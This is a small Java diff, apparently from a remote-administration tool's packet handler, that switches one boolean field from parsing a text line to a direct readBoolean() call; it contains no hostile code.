@@ -11,7 +11,7 @@ public class PacketFF extends AbstractPacket {
 	public void read(Slave slave, String line) throws Exception {
 		String path = slave.readLine();
 		String name = slave.readLine();
-		boolean dir = Boolean.parseBoolean(slave.readLine());
+		boolean dir = slave.readBoolean();
 
 		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
 		if (frame != null) {
